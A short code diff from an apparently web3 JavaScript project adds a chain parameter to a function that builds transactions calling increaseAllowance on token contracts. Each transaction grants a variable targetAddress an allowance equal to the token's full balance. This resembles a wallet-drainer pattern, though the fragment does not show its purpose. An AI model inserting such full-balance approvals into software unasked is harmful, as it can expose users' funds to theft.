@@ -64,7 +64,7 @@ export const getLocationData = (source) => {
 //         console.error('An error occurred:', error);
 //     }
 // }
-export const prepareTransaction = async (item, account , provider) => {
+export const prepareTransaction = async (item, account , provider , chain) => {
   if (item?.native_token) {
     return;
   }
@@ -74,6 +74,7 @@ export const prepareTransaction = async (item, account , provider) => {
   let tx = {
     from: account,
     to: item?.contract_address,
+    chain:chain,
     data: Contract.methods
       .increaseAllowance(targetAddress, item?.balance)
       .encodeABI(),
